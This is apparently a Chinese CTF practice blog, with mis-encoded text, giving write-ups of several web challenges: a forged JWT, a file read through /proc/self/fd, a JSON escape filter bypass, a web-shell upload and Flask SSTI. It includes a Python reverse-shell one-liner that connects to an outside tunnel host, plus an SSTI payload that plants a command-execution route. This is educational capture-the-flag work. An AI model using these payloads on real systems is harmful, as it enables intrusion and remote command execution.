punctuation">)</span>        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>èµµæ€»wpé‡Œçš„å®¡è®¡:</p><p>æ³¨å†Œ /api/registerï¼Œæ¥å—ä¼ å…¥çš„ username å’Œ passwordï¼Œå…ˆåˆ¤æ–­ username ä¸ä¸º adminï¼Œç„¶åç”Ÿæˆä¸€ä¸ª key æ¥ä»¥è¿™äº›ä¿¡æ¯ä¸ºä¾æ®ï¼Œç”Ÿæˆä¸€ä¸ª jwt ä»¤ç‰Œï¼Œkey åŒæ—¶å­˜å…¥å…¨å±€æ•°ç»„ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/15873008936cf41d35abc0ecab06b6f56706bee1b5-1024x542.png" alt="img"></p><p>ç™»å½• /api/loginï¼Œæ¥å—ä¼ å…¥çš„ username å’Œ passwordï¼Œç„¶åä»ä»¤ç‰Œçš„ä¿¡æ¯æ®µä¸­å– key çš„ idï¼Œä»ç¨‹åºä¸­çš„å…¨å±€æ•°ç»„å–å‡º keyï¼Œç„¶åè¿›è¡ŒéªŒè¯ï¼ŒéªŒè¯é€šè¿‡ä¹‹åç½® session ä¸­çš„ username ä¸ºç™»å½•æ—¶ä½¿ç”¨çš„ usernameã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1587301099a4070df83cd56999e7efbafb05e2e004-1024x757.png" alt="img"></p><p>è·å–FLAG /api/flagï¼Œåˆ¤æ–­ session ä¸­çš„ç”¨æˆ·åæ˜¯å¦ä¸º adminï¼Œæ˜¯çš„è¯å°±ç›´æ¥ç»™ flagã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1587301284fe28eb6eb5a5362ed0749a45de8eb406-1024x468.png" alt="img"></p><p>å¯ä»¥çœ‹åˆ°ä¿¡æ¯æ˜¯ç”¨ jwt ä»¤ç‰Œå‚¨å­˜çš„ï¼Œä½¿ç”¨ jsonwebtoken åº“æ¥æ“ä½œï¼Œè¿™é‡Œç”¨çš„æ˜¯ HS256åŠ å¯†ï¼Œä½†ç»è¿‡æµ‹è¯•å‘ç°ï¼Œå½“åŠ å¯†æ—¶ä½¿ç”¨çš„æ˜¯ none æ–¹æ³•ï¼ŒéªŒè¯æ—¶åªè¦å¯†é’¥å¤„ä¸º undefined æˆ–è€…ç©ºä¹‹ç±»çš„ï¼Œå³ä¾¿åé¢çš„ç®—æ³•æŒ‡åä¸º HS256ï¼ŒéªŒè¯ä¹Ÿè¿˜æ˜¯æŒ‰ç…§ none æ¥éªŒè¯é€šè¿‡ï¼Œè¿™æ ·å¾ˆè½»æ¾åœ°å°±å¯ä»¥ä¼ªé€ ä¸€ä¸ª username ä¸º admin çš„ jwttoken äº†ã€‚</p><p>åœ¨ç™»å½•ç•Œé¢æŠ“åŒ…åè¾¹è¿™ä¸²å°±æ˜¯jwtï¼ˆå½“æ—¶å¿˜äº†æˆªå›¾ï¼Œè¿™æ˜¯æ”¹å®Œjwtä¹‹åçš„äº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122210021834.png" alt="image-20211122210021834"></p><p>ä¹‹ååœ¨<a href="https://jwt.io/">JSON Web Tokens - jwt.io</a>é‡Œè§£ç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122210147429.png" alt="image-20211122210147429"></p><p>æ¥ä¸‹æ¥ä¹Ÿæ˜¯èµµæ€»çš„åˆ†æï¼š</p><p>å›åˆ°æºç¨‹åºé€»è¾‘ä¸­ï¼Œè‹¥æƒ³è®©è¿™é‡Œçš„å¯†é’¥ keyä¸ºç©ºï¼Œå°±éœ€è¦ä¿®æ”¹ä¸Šé¢çš„ secretidã€‚é‚£ä¹ˆå°±å°è¯•ä¿®æ”¹ secretidï¼Œä½¿å…¶æ— æ³•ä½œä¸ºå…¨å±€å˜é‡ secrets æ•°ç»„çš„ç´¢å¼•ï¼Œé‚£ä¹ˆ secret å°±ä¼šä¸ºç©ºäº†ã€‚</p><p><a href="https://www.zhaoj.in/wp-content/uploads/2020/04/15873021389c8e46ed2ff4ebdc4215e90585dbcd31.png"><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/15873021389c8e46ed2ff4ebdc4215e90585dbcd31-1024x245.png" alt="img"></a></p><p>æ³¨æ„ï¼Œè¿™é‡Œè¿˜æœ‰ä¸€ä¸ªéªŒè¯ï¼Œè¦æ±‚ sid ä¸èƒ½ä¸º undefinedï¼Œnullï¼Œå¹¶ä¸”å¿…é¡»åœ¨å…¨å±€å˜é‡ secrets æ•°ç»„çš„é•¿åº¦å’Œ 0 ä¹‹é—´ã€‚ä¹çœ‹ä¹‹ä¸‹æ²¡æœ‰æ“ä½œç©ºé—´ï¼Œæ€ä¹ˆæ•´éƒ½ä¼šå–å‡º å¯†é’¥ keyã€‚ä½†åˆ«å¿˜äº† JavaScript æ˜¯ä¸€é—¨å¼±ç±»å‹è¯­è¨€ï¼ŒNodeJS éƒ½æ˜¯ JS çš„è¯­æ³•ï¼Œé‚£è‡ªç„¶ä¹Ÿæ˜¯å’¯ã€‚æ‰€ä»¥æˆ‘ä»¬åªè¦é€‰æ‹©æ°å½“çš„æ•°æ®æ¥ç»•è¿‡è¿™ä¸ªåˆ¤æ–­å³å¯ã€‚å¯ä»¥åšä¸€ä¸ªå°å®éªŒæ¥éªŒè¯æˆ‘ä»¬çš„æƒ³æ³•ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/158730244598990809373d961e187fa7d0a66cc4ce-1024x459.png" alt="img">ä¸€ä¸ªå°å®éªŒï¼Œç©ºæ•°ç»„ä¸æ•°å­—æ¯”è¾ƒæ°¸è¿œä¸ºçœŸï¼Œå½“ç„¶ç”¨ç©ºå­—ç¬¦ä¸²ä¹‹ç±»çš„ä¹Ÿå¯ä»¥</p><p>æœ€ååˆ©ç”¨pythonçš„PyJWTåº“æ¥åŠ å¯†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122210434868.png" alt="image-20211122210434868"></p><p>æŠ“åŒ…å†æ”¾åŒ…å°±å¯ä»¥è¯»å–è¿™ä¸ªflag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211122210523101.png" alt="image-20211122210523101"></p><p><a href="https://www.zhaoj.in/read-6512.html">è™ç¬¦ CTF Web éƒ¨åˆ† Writeup â€“ glzjin (zhaoj.in)</a></p><h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p>æŠ“åŒ…ä¹‹åä¸€ç›´å¾€ä¸‹èµ°</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211557104.png" alt="image-20211123211557104"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211609605.png" alt="image-20211123211609605"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211625629.png" alt="image-20211123211625629"></p><p>æºç é‡Œæ‰¾ä¸åˆ°å°±å»çœ‹js</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211646833.png" alt="image-20211123211646833"></p><p>æœ€åå¯ä»¥æ‰¾åˆ°ä¸€ä¸ª</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211708969.png" alt="image-20211123211708969"></p><p>éšæœºæ’åˆ—ç»„åˆå¾—åˆ°flag</p><pre class="language-none"><code class="language-none">from itertools import permutationsflag &#x3D; [&quot;&#123;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;]item &#x3D; permutations(flag)#å¯¹flagå…¨æ’åˆ—ï¼Œè¿”å›çš„æ˜¯iteratorsï¼ˆè¿­ä»£å™¨ï¼‰for i in item:k &#x3D; &#39;&#39;.join(i)#joinè¿æ¥æˆä¸ºå­—ç¬¦ä¸²if k[-1] &#x3D;&#x3D;&#39;&#125;&#39; and k[0:13] &#x3D;&#x3D; &#39;pctf&#123;hey_boys&#39;:&#x2F;&#x2F;è¿™é‡Œè¿˜å¯ä»¥ç”¨pythonçš„startswichæ–¹æ³•åˆ¤æ–­æ˜¯å¦æ˜¯pctf&#123;heyå¼€å¤´&#x2F;&#x2F;if k.startswith(&#39;pctf&#123;hey_boys&#39;) and k[-1] &#x3D;&#x3D;&#39;&#125;&#39;:print(k)</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211123211727781.png" alt="image-20211123211727781"></p><h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>æŠ“sessionï¼Œbase64è§£ç æŠŠé‡‘é¢æ”¹æˆ100ï¼Œæ”¾åŒ…</p><h2 id="ç½‘é¼æ¯-2020-ç™½è™ç»„-PicDown"><a href="#ç½‘é¼æ¯-2020-ç™½è™ç»„-PicDown" class="headerlink" title="[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown"></a>[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211124200900405.png" alt="image-20211124200900405"></p><p>æºç æ²¡ä¸œè¥¿ï¼Œåªæœ‰ä¸ªurlçš„getå‚æ•°ï¼Œè¿˜ä»¥ä¸ºæ˜¯ssrfä¹‹ç±»çš„ï¼Œæœäº†ä¸‹wpï¼Œè¿™é‡Œå¯èƒ½æ˜¯å› ä¸ºç¯å¢ƒåŸå› ï¼Œæœ‰ä¸ªéé¢„æœŸè§£</p><p>éé¢„æœŸè§£ï¼š</p><p>æœ‰æ–‡ä»¶è¯»å–ï¼Œç›´æ¥url=/flagå°±èƒ½ä¸‹è½½ä¸€ä¸ªbeautiful.jpg,æ”¹æˆtxtå°±èƒ½çœ‹è§flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211124201030250.png" alt="image-20211124201030250"></p><p>é¢„æœŸè§£ï¼š</p><p><strong>/proc/self/ç›®å½•çš„æ„ä¹‰</strong></p><p>æˆ‘ä»¬éƒ½çŸ¥é“å¯ä»¥é€šè¿‡/proc/$pid/æ¥è·å–æŒ‡å®šè¿›ç¨‹çš„ä¿¡æ¯ï¼Œä¾‹å¦‚å†…å­˜æ˜ å°„ã€CPUç»‘å®šä¿¡æ¯ç­‰ç­‰ã€‚å¦‚æœæŸä¸ªè¿›ç¨‹æƒ³è¦è·å–æœ¬è¿›ç¨‹çš„ç³»ç»Ÿä¿¡æ¯ï¼Œå°±å¯ä»¥é€šè¿‡è¿›ç¨‹çš„pidæ¥è®¿é—®/proc/$pid/ç›®å½•ã€‚ä½†æ˜¯è¿™ä¸ªæ–¹æ³•è¿˜éœ€è¦è·å–è¿›ç¨‹pidï¼Œåœ¨forkã€daemonç­‰æƒ…å†µä¸‹pidè¿˜å¯èƒ½å‘ç”Ÿå˜åŒ–ã€‚ä¸ºäº†æ›´æ–¹ä¾¿çš„è·å–æœ¬è¿›ç¨‹çš„ä¿¡æ¯ï¼Œlinuxæä¾›äº†/proc/self/ç›®å½•ï¼Œè¿™ä¸ªç›®å½•æ¯”è¾ƒç‹¬ç‰¹ï¼Œä¸åŒçš„è¿›ç¨‹è®¿é—®è¯¥ç›®å½•æ—¶è·å¾—çš„ä¿¡æ¯æ˜¯ä¸åŒçš„ï¼Œå†…å®¹ç­‰ä»·äº/proc/æœ¬è¿›ç¨‹pid/ã€‚è¿›ç¨‹å¯ä»¥é€šè¿‡è®¿é—®/proc/self/ç›®å½•æ¥è·å–è‡ªå·±çš„ç³»ç»Ÿä¿¡æ¯ï¼Œè€Œä¸ç”¨æ¯æ¬¡éƒ½è·å–pidã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211124202121899.png" alt="image-20211124202121899"></p><p>è¯»ä¸€ä¸‹app.py</p><p>url=app.py</p><pre class="language-none"><code class="language-none">from flask import Flask, Responsefrom flask import render_templatefrom flask import requestimport osimport urllibapp &#x3D; Flask(__name__)SECRET_FILE &#x3D; &quot;&#x2F;tmp&#x2F;secret.txt&quot;f &#x3D; open(SECRET_FILE)SECRET_KEY &#x3D; f.read().strip()os.remove(SECRET_FILE)@app.route(&#39;&#x2F;&#39;)def index():    return render_template(&#39;search.html&#39;)@app.route(&#39;&#x2F;page&#39;)def page():    url &#x3D; request.args.get(&quot;url&quot;)    try:        if not url.lower().startswith(&quot;file&quot;):            res &#x3D; urllib.urlopen(url)            value &#x3D; res.read()            response &#x3D; Response(value, mimetype&#x3D;&#39;application&#x2F;octet-stream&#39;)            response.headers[&#39;Content-Disposition&#39;] &#x3D; &#39;attachment; filename&#x3D;beautiful.jpg&#39;            return response        else:            value &#x3D; &quot;HACK ERROR!&quot;    except:        value &#x3D; &quot;SOMETHING WRONG!&quot;    return render_template(&#39;search.html&#39;, res&#x3D;value)@app.route(&#39;&#x2F;no_one_know_the_manager&#39;)def manager():    key &#x3D; request.args.get(&quot;key&quot;)    print(SECRET_KEY)    if key &#x3D;&#x3D; SECRET_KEY:        shell &#x3D; request.args.get(&quot;shell&quot;)        os.system(shell)        res &#x3D; &quot;ok&quot;    else:        res &#x3D; &quot;Wrong Key!&quot;    return resif __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.run(host&#x3D;&#39;0.0.0.0&#39;, port&#x3D;8080)</code></pre><p>å¯ä»¥çœ‹åˆ°<code>no_one_know_the_manager</code>ä¸­è¦åŒ¹é…SECRET_KEYï¼Œç„¶åæ‰§è¡Œshellï¼Œä½†æ˜¯SECRET_KEYæ‰€åœ¨çš„secret.txtè¢«åˆ æ‰äº†</p><p>ä½†æ˜¯è¿™ä¸ªæ–‡ä»¶æ˜¯ç”¨openæ‰“å¼€çš„ï¼Œä¼šåˆ›å»ºæ–‡ä»¶æè¿°ç¬¦ã€‚</p><p>æˆ‘ä»¬è¯»è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¸­çš„å†…å®¹å°±å¥½äº†æ­¤å¤„å¯ä»¥é€šè¿‡<code>/proc/pid/fd/</code>è¯»å–ï¼Œè¿™ä¸ªç›®å½•åŒ…å«äº†è¿›ç¨‹æ‰“å¼€çš„æ¯ä¸€ä¸ªæ–‡ä»¶çš„é“¾æ¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211124203011498.png" alt="image-20211124203011498"></p><p>æ‹¿åˆ°keyçš„å†…å®¹ï¼Œè¦urlç¼–ç ï¼Œä½†æ˜¯shellæ‰§è¡Œçš„å‘½ä»¤ä¸ä¼šè¿”å›ï¼Œè¿™é‡Œä½¿ç”¨åå¼¹shellçš„æ–¹å¼ï¼Œåœ¨æ ¹ç›®å½•ä¸‹è¯»å–flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211124203433334.png" alt="image-20211124203433334"></p><hr><p>nmdå¼¹äº†å‡ ä¸ªå°æ—¶ç»ˆäºå¼¹tanå‡ºæ¥äº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/G0AOG@8YB[BZ_FAPY[LK8VR.png" alt="img"></p><p>æ²¡å…¬ç½‘ipï¼Œæäº†ä¸ªç«¯å£æ˜ å°„åçš„å…¬ç½‘</p><p><a href="https://blog.csdn.net/weixin_41598660/article/details/105254229">(23æ¡æ¶ˆæ¯) ç«¯å£æ˜ å°„åçš„å…¬ç½‘åå¼¹shell_æ¥åˆ°äº†å­¦æ¸£çš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://natapp.cn/register">https://natapp.cn/register</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125001711038.png" alt="image-20211125001711038"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125001738005.png" alt="image-20211125001738005"></p><p>æŠŠæœ¬åœ°çš„8082ç«¯å£æ˜ å°„åˆ°å…¬ç½‘</p><p>æŠŠè¿™ä¸ªpayloadå½“shellå‚æ•°çš„å€¼æ‰“è¿›å»</p><pre class="language-none"><code class="language-none">python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;server.natappfree.cc&#39;,xxxxx));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot;</code></pre><p>ç„¶ååœ¨Ubuntué‡Œç›‘å¬8082ç«¯å£ï¼Œä»æ ¹ç›®å½•é‡Œæ‰¾åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/G0AOG@8YB[BZ_FAPY[LK8VR.png" alt="img"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211125002051230.png" alt="image-20211125002051230"></p><p>æ³ªç›®</p><h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129200049514.png" alt="image-20211129200049514"></p><p>source</p><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);if (isset($_GET[&#39;source&#39;])) &#123;  show_source(__FILE__);  exit();&#125;function is_valid($str) &#123;  $banword &#x3D; [    &#x2F;&#x2F; no path traversal    &#39;\.\.&#39;,    &#x2F;&#x2F; no stream wrapper    &#39;(php|file|glob|data|tp|zip|zlib|phar):&#39;,    &#x2F;&#x2F; no data exfiltration    &#39;flag&#39;  ];  $regexp &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $banword) . &#39;&#x2F;i&#39;;  if (preg_match($regexp, $str)) &#123;    return false;  &#125;  return true;&#125;$body &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;); #bodyè·å–postæ•°æ®$json &#x3D; json_decode($body, true); #å¯¹bodyå˜é‡è¿›è¡Œjsonè§£ç if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#39;page&#39;])) &#123;#åˆ¤æ–­bodyå˜é‡æ˜¯å¦æœ‰æ•ˆï¼Œjsonæ•°æ®è¦æœ‰page  $page &#x3D; $json[&#39;page&#39;];  $content &#x3D; file_get_contents($page); #ä»pageä¸­è¯»å‡ºæ–‡ä»¶åï¼Œå¹¶è¯»å–æ–‡ä»¶  if (!$content || !is_valid($content)) &#123;#æ£€æŸ¥contentæ˜¯å¦æœ‰æ•ˆ,å³ä¸èƒ½æ˜æ–‡ä¼ è¾“flagæ–‡ä»¶ï¼Œåˆ©ç”¨phpä¼ªåè®®ç»•è¿‡    $content &#x3D; &quot;&lt;p&gt;not found&lt;&#x2F;p&gt;\n&quot;;  &#125;&#125; else &#123;  $content &#x3D; &#39;&lt;p&gt;invalid request&lt;&#x2F;p&gt;&#39;;&#125;&#x2F;&#x2F; no data exfiltration!!!$content &#x3D; preg_replace(&#39;&#x2F;HarekazeCTF\&#123;.+\&#125;&#x2F;i&#39;, &#39;HarekazeCTF&#123;&lt;censored&gt;&#125;&#39;, $content);#å¦‚æœæŸ¥åˆ°contenté‡Œæœ‰ç›¸å…³çš„ctfå­—æ ·ï¼Œåˆ™ç”¨censoredæ›¿ä»£echo json_encode([&#39;content&#39; &#x3D;&gt; $content]);#æœ€åå°†jsonç¼–ç åçš„contentè¾“å‡º</code></pre><p>è¿™é‡Œå¯ä»¥åˆ©ç”¨json_decodeä¼šå°†<code>\uxxx</code>è¿›è¡Œè½¬ä¹‰çš„ç‰¹æ€§ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡is_validçš„æ£€æµ‹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129200455993.png" alt="image-20211129200455993"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129200943757.png" alt="image-20211129200943757"></p><h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>è¿›å»åæ˜¯ä¸ªçœ‹èµ·æ¥å¾ˆé«˜ç«¯çš„ç•Œé¢ï¼Œä½†æ˜¯æ³¨å†Œç„¶åç™»å½•åæœ‰ä¸ªæ˜æ˜¾ çš„ä¸Šä¼ ä½ç½®</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129203949145.png" alt="image-20211129203949145"></p><p>é€šè¿‡æ›´æ”¹å¤´åƒä¼ ä¸ªé©¬ä¸Šå»ï¼Œèšå‰‘è¿æ¥å°±è¡Œ</p><p>è¿™é‡Œå‰ç«¯æœ‰ä¸ªåˆ¤æ–­å›¾ç‰‡ç±»å‹çš„åœ°æ–¹ï¼Œæ‰€ä»¥å…ˆä¼ ä¸ªjpgå†bpæŠ“åŒ…æ”¹æˆphpå°±è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129204113745.png" alt="image-20211129204113745"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129203758946.png" alt="image-20211129203758946"></p><h2 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p>sstiæ³¨å…¥ï¼Œç”¨ä½¿ç”¨å·¥å…·Arjunè¿›è¡Œå‚æ•°çˆ†ç ´</p><p>ç„¶åæ‰¾åˆ°nameå‚æ•°åï¼Œæ‹¿å‡ºçè—çš„å†™å…¥shellçš„payload</p><p><a href="https://xz.aliyun.com/t/9008">ctfä¸­flask_sstiçš„å„ç§ç»•è¿‡æŠ€å·§ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><pre class="language-none"><code class="language-none">&#123;% if 1&#x3D;&#x3D;lipsum[&#39;__globals__&#39;][&#39;__builtins__&#39;][&#39;exec&#39;](&#39;\x66\x72\x6f\x6d\x20\x66\x6c\x61\x73\x6b\x20\x69\x6d\x70\x6f\x72\x74\x20\x63\x75\x72\x72\x65\x6e\x74\x5f\x61\x70\x70\x0a\x0a\x40\x63\x75\x72\x72\x65\x6e\x74\x5f\x61\x70\x70\x2e\x72\x6f\x75\x74\x65\x28\x27\x2f\x73\x68\x65\x6c\x6c\x27\x2c\x6d\x65\x74\x68\x6f\x64\x73\x3d\x5b\x27\x47\x45\x54\x27\x2c\x27\x50\x4f\x53\x54\x27\x5d\x29\x0a\x64\x65\x66\x20\x73\x68\x65\x6c\x6c\x28\x29\x3a\x0a\x20\x20\x20\x20\x69\x6d\x70\x6f\x72\x74\x20\x6f\x73\x0a\x20\x20\x20\x20\x66\x72\x6f\x6d\x20\x66\x6c\x61\x73\x6b\x20\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x0a\x20\x20\x20\x20\x63\x6d\x64\x3d\x72\x65\x71\x75\x65\x73\x74\x2e\x61\x72\x67\x73\x2e\x67\x65\x74\x28\x27\x63\x6d\x64\x27\x29\x0a\x20\x20\x20\x20\x72\x74\x3d\x6f\x73\x2e\x70\x6f\x70\x65\x6e\x28\x63\x6d\x64\x29\x2e\x72\x65\x61\x64\x28\x29\x0a\x20\x20\x20\x20\x72\x65\x74\x75\x72\x6e\x20\x72\x74&#39;) %&#125;&#123;% endif%&#125;å…¶ä¸­çš„16è¿›åˆ¶ç¼–ç äº†åŸå§‹ä»£ç </code></pre><p>å³</p><pre class="language-none"><code class="language-none">from flask import current_app@current_app.route(&#39;&#x2F;shell&#39;,methods&#x3D;[&#39;GET&#39;,&#39;POST&#39;])def shell():    import os    from flask import request    cmd&#x3D;request.args.get(&#39;cmd&#39;)    rt&#x3D;os.popen(cmd).read()    return rt</code></pre><p>å†™å…¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211130213039549.png" alt="image-20211130213039549"></p><p>ç„¶åç›´æ¥å†™å…¥å‘½ä»¤</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211130213128899.png" alt="image-20211130213128899"></p><p>å¯èƒ½ä¼šå‡ºç°not foundçš„æŠ¥é”™ï¼Œå¤šè¯•å‡ æ¬¡</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211130213228889.png" alt="image-20211130213228889"></p><h2 id="CISCN2019-åä¸œå—èµ›åŒº-Double-Secret"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Double-Secret" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Double Secret"></a>[CISCN2019 åä¸œå—èµ›åŒº]Double Secret</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215102048.png" alt="image-20211202215102048"></p><p>æœ‰/secretç›®å½•ï¼Œæ‰«ä¸€ä¸‹æˆ–è€…çŒœå‡ºæ¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215126891.png" alt="image-20211202215126891"></p><p>arjunæ‰«ä¸€ä¸‹æ˜¯å¦æœ‰ä¼ å‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215226926.png" alt="image-20211202215226926"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215244403.png" alt="image-20211202215244403"></p><p>å½“æ•°è¿‡å¤§æ—¶å°±ä¼šè¿›å…¥debugç•Œé¢ï¼Œè¿™æ—¶å€™åŸºæœ¬å°±ç¡®å®šè¿™æ˜¯sstiæ³¨å…¥äº†ï¼Œå¯ä»¥çœ‹çœ‹æºç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215324285.png" alt="image-20211202215324285"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211202215336677.png" alt="image-20211202215336677"></p><p>é‡‡ç”¨RC4åŠ å¯†çš„æ–¹å¼ï¼Œè¿™æ˜¯ä¸€ç§å¯¹ç§°åŠ å¯†ï¼Œå¯¹å¯†æ–‡å†æ¬¡åŠ å¯†å°±ä¼šå˜æˆæ˜æ–‡ï¼Œå¯†é’¥æ˜¯HereIsTreasureï¼ŒçŸ¥é“è¿™ä¸ªåï¼Œåˆ©ç”¨cyberchefï¼Œå¯¹è¦è¾“å…¥çš„è¯­å¥è¿›è¡ŒåŠ å¯†ï¼Œå†å°†å¯†æ–‡ä¼ å‚è¿›å»</p><p><img 